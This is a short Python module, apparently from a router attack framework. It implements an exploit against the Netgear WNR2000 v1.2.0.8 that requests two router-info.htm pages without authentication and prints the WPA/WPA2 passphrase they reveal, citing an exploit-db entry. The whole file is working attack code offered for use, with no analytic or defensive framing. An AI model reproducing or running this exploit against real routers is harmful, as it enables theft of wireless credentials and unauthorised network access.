import urllib
import util
from ..router_vuln import RouterVuln

__router__ = 'WNR2000 v1.2.0.8'
__vuln__='Read WPA/WPA2 Password'
class GetPass(RouterVuln):
	"""Read the WPA/WPA2 passphrase
	   http://www.exploit-db.com/exploits/9498/
	"""
	def __init__(self):
		super(GetPass,self).__init__()

	def run(self):
		util.Msg('Fetching password from %s...'%self.ip)
		url = 'http://%s/router-info.htm'%self.ip
		url2 = 'http://%s/cgi-bin/router-info.htm'%self.ip
		try:
			response = urllib.urlopen(url).read()
			response2 = urllib.urlopen(url2).read()
			util.Msg('First:')
			print '\t' + response
			util.Msg('Second:')
			print '\t' + response2
		except Exception, e:
			util.Error('Error: %s'%e)
